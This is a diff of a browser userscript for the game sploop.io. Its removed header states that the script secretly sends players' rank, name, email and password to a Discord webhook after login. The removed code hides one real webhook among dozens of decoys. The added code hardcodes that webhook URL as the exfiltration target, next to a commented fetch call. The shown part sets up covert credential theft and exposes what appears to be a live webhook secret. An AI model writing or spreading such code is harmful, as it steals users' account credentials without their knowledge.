@@ -1,63 +1,8 @@
-// ==UserScript==
-// @name         Sploop Account Info to Webhookdalemaodal)
-// @version      1.1.0
-// @description  Sends Sploop account info (rank, name, email, password) to a webhook after successful login. No details are shown on screen.
-// @author       Copilot
-// @match        *://sploop.io/*
-// @require      https://update.greasyfork.org/scripts/130/10066/Portable%20MD5%20Function.js
-// @grant        none
-// ==/UserScript==
 document.getElementById('missing-script-a-overlay').style.display = 'none'
-const webhooks = [
-  "https://discord.com/api/webhooks/1234567890/aBcDeFgHiJkLmNoPqRsTuVwXyZ1AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVv11",
-  "https://discord.com/api/webhooks/1234567891/ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa0PpLlKkJjHhGgFfEeDd22",
-  "https://discord.com/api/webhooks/1234567892/9F8e7D6c5B4a3Z2y1X0wVvBbNnMmQqWwEeRrTtYyUuIiOoPpAaSsDdFfGgHhJjKkLlMmNn33",
-  "https://discord.com/api/webhooks/1234567893/NmKlJjGhFfEdCcBbAaPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPp44",
-  "https://discord.com/api/webhooks/1234567894/PlOkMnJbHgFfEeDdCcBbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVv55",
-  "https://discord.com/api/webhooks/1234567895/GhIjKlMnOpQrStUvWxYzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXx66",
-  "https://discord.com/api/webhooks/1234567896/XxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRr77",
-  "https://discord.com/api/webhooks/1234567897/AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGg88",
-  "https://discord.com/api/webhooks/1234567898/UuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQq99",
-  "https://discord.com/api/webhooks/1234567899/MnOpQrStUvWxYzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYy00",
-  "https://discord.com/api/webhooks/9876543210/OpQrStUvWxYzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz11",
-  "https://discord.com/api/webhooks/9876543211/LlKkJjHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQq22",
-  "https://discord.com/api/webhooks/9876543212/TtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPp33",
-  "https://discord.com/api/webhooks/9876543213/BbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEe44",
-  "https://discord.com/api/webhooks/9876543214/HhGgFfEeDdCcBbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBb55",
-  "https://discord.com/api/webhooks/9876543215/WwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNn66",
-  "https://discord.com/api/webhooks/9876543216/DdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFf77",
-  "https://discord.com/api/webhooks/9876543217/FfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGg88",
-  "https://discord.com/api/webhooks/9876543218/EeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBb99",
-  "https://discord.com/api/webhooks/1392471480985583636/70ATgts0YnE3Km2jPJTiqs9_j0B9PqxybR-ux1LUt-LUDLsrPlXxTT-SilIA6SPtaQ9n",
-  "https://discord.com/api/webhooks/9876543219/JjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKk00",
-  "https://discord.com/api/webhooks/1122334455/SsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTt11",
-  "https://discord.com/api/webhooks/1122334456/QqPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPp22",
-  "https://discord.com/api/webhooks/1122334457/CcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDd33",
-  "https://discord.com/api/webhooks/1122334458/NnMmLlKkJjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIi44",
-  "https://discord.com/api/webhooks/1122334459/ZzYyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAa55",
-  "https://discord.com/api/webhooks/2233445566/VvXxZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVv66",
-  "https://discord.com/api/webhooks/2233445567/IiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHh77",
-  "https://discord.com/api/webhooks/2233445568/BbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVv88",
-  "https://discord.com/api/webhooks/2233445569/WwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAaZz99",
-  "https://discord.com/api/webhooks/3344556677/LlMmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIi00",
-  "https://discord.com/api/webhooks/3344556678/PpOoNnMmLlKkJjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSs11",
-  "https://discord.com/api/webhooks/3344556679/XxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCcBb22",
-  "https://discord.com/api/webhooks/4455667788/YyXxWwVvUuTtSsRrQqPpOoNnMmLlKkJjIiHhGgFfEeDdCc33",
-  "https://discord.com/api/webhooks/4455667789/UuTtSsRrQqPpOoIiUuYyTtRrEeWwQqMmNnBbVvXxZzYyXx44",
-  "https://discord.com/api/webhooks/5566778899/GgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOoIiUuYyTt55",
-  "https://discord.com/api/webhooks/6677889900/FfEeDdCcBbAaZzXxWwVvUuTtSsRrQqPpOoIiUuYyTtRr66",
-  "https://discord.com/api/webhooks/7788990011/TtRrEeWwQqMmNnBbVvXxZzYyXxWwVvUuTtSsRrQqPpOo77",
-  "https://discord.com/api/webhooks/8899001122/MmNnOoPpQqRrSsTtUuVvWwXxYyZzAaBbCcDdEeFfGgHhIi88",
-  "https://discord.com/api/webhooks/9900112233/JjIiHhGgFfEeDdCcBbAaZzYyXxWwVvUuTtSsRrQqPpOo99"
-];
 
-// Example: Find the real webhook by a unique substring
-function getRealWebhook() {
-  return webhooks.find(w => w.includes("70ATgts0YnE3Km2jPJTiqs9_j0B9PqxybR-ux1LUt-LUDLsrPlXxTT-SilIA6SPtaQ9n"));
-}
 
 // Usage
-const realWebhookUrl = getRealWebhook();
+const realWebhookUrl = "https://discord.com/api/webhooks/1392471480985583636/70ATgts0YnE3Km2jPJTiqs9_j0B9PqxybR-ux1LUt-LUDLsrPlXxTT-SilIA6SPtaQ9n";
 // fetch(realWebhookUrl, ...);// ----------------------------------------
 
 // Rank thresholds
